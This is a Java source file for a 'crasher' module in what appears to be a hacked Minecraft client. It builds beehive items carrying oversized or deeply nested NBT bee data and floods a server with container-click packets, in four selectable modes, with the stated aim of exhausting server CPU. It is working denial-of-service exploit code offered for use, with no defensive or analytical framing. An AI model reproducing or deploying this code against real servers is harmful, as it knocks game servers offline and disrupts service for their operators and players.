package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import org.jetbrains.annotations.NotNull;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.protocol.XynisProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataBees;
import us.whitedev.protocol.components.objects.ItemType;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Optional;

public class Echo1 implements Crasher {
    private static final String METHOD_NAME = "Echo1";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int depth = Integer.parseInt(args[4]);
        String type = args[5].toLowerCase(Locale.ROOT);

        setEnabled(true);
        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if(XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol) && type.equals("main2")) {
            sendMain2DataPackets(size, protocol, packets);
        }else{
            ItemStack stack;
            switch (type) {
                case "netty1" -> stack = getNettyStack1(size);
                case "main1" -> stack = getMainStack1(size, depth);
                case "netty2" -> stack = getNettyStack2(size);
                default -> stack = getMainStack2(size);
            }

            for (int i = 0; i < packets; i++)
                PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, stack, new Int2ObjectOpenHashMap<>()));

        }
        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private void sendMain2DataPackets(int size, int protocol, int packets){
        List<DataBees.BeeEntry> list = new ArrayList<>();
        for (int i = 0; i < size; i++) {
            list.add(new DataBees.BeeEntry(new CompoundTag(), 0, 0));
        }

        DataComponents components = new DataComponents();
        components.put(new DataBees(list));
        us.whitedev.protocol.components.objects.ItemStack stack = new us.whitedev.protocol.components.objects.ItemStack(ItemType.BEEHIVE.getId(protocol), 1, components);

        PacketCodec.sendPacket(new PacketContainerClick(protocol ,0, 1, 10,
                PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                stack, new Int2ObjectArrayMap<>()), packets);
    }

    private @NotNull ItemStack getMainStack2(int size) {
        CompoundTag blockEntityTag = new CompoundTag();
        CompoundTag beeHiveTag = new CompoundTag();
        ListTag beesList = new ListTag();
        for (int i = 0; i < size; i++)
            beesList.add(new CompoundTag());

        blockEntityTag.put("Bees", beesList);
        beeHiveTag.put("BlockEntityTag", blockEntityTag);

        return new ItemStack(Items.BEEHIVE, 1, Optional.of(beeHiveTag));
    }

    private @NotNull ItemStack getNettyStack2(int size) {
        CompoundTag tag = new CompoundTag();
        CompoundTag blockEntityTag = new CompoundTag();
        blockEntityTag.putString("id", "minecraft:beehive");
        ListTag beesList = new ListTag();
        for (int i = 0; i < size; ++i) {
            CompoundTag beeEntry = new CompoundTag();
            CompoundTag entityData = new CompoundTag();

            entityData.putString("id", "minecraft:bee");
            entityData.putFloat("Health", 10.0f);
            entityData.putByte("HasNectar", (byte) 1);

            beeEntry.put("EntityData", entityData);
            beeEntry.putInt("MinOccupationTicks", 1);
            beeEntry.putInt("TicksInHive", 1);

            CompoundTag testTag = new CompoundTag();
            testTag.put("Bees", beesList);
            testTag.putString("id", "minecraft:beehive");

            beesList.add(beeEntry);
        }
        blockEntityTag.put("Bees", beesList);
        tag.put("BlockEntityTag", blockEntityTag);
        return new ItemStack(Items.BEEHIVE, 1, Optional.of(tag));
    }

    private @NotNull ItemStack getNettyStack1(int size) {
        CompoundTag compoundTag = new CompoundTag();
        ListTag beesList = new ListTag();
        CompoundTag beeTag = new CompoundTag();
        CompoundTag entityData = new CompoundTag();
        for (int i = 0; i < size; ++i) {

            entityData.putString("id", "minecraft:bee");
            entityData.putFloat("Health", 10.0f);
            entityData.putByte("HasNectar", (byte) 1);
            entityData.putByte("HasStung", (byte) 0);

            beeTag.put("EntityData", entityData);
            beeTag.putInt("MinOccupationTicks", 2400);
            beeTag.putInt("TicksInHive", 1000);

            beesList.add(beeTag);
        }

        compoundTag.put("Bees", beesList);
        compoundTag.putString("id", "minecraft:beehive");
        return new ItemStack(Items.BEEHIVE, 1, Optional.of(compoundTag));
    }

    private @NotNull ItemStack getMainStack1(int size, int depth) {
        CompoundTag compoundTag = new CompoundTag();
        ListTag beesList = new ListTag();
        CompoundTag beeTag = new CompoundTag();
        CompoundTag entityData = new CompoundTag();
        for (int i = 0; i < size; ++i) {
            CompoundTag current = entityData;
            for (int j = 0; j < depth; j++) {
                CompoundTag next = new CompoundTag();
                next.put("nested", new CompoundTag());
                current = next;
            }
            entityData.put("deeplyNested", current);

            entityData.putString("id", "minecraft:bee");
            entityData.putFloat("Health", 10.0f);
            beeTag.put("EntityData", entityData);
            beesList.add(beeTag);
        }

        compoundTag.put("Bees", beesList);
        compoundTag.putString("id", "minecraft:beehive");
        return new ItemStack(Items.BEEHIVE, 1, Optional.of(compoundTag));
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Power", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Depth", OptionType.INTEGER),
                new OptionUtil("Type", OptionType.LIST, new String[]{"Netty1", "Netty2", "Main1", "Main2"})
        );
    }

    @Override
    public String getArgsUsage() {
        return "Packets[1], Mode[Map], NBTPower[16000]";
    }

    @Override
    public String getDescription() {
        return "Fuck CPU Crasher [1.20+]";
    }
}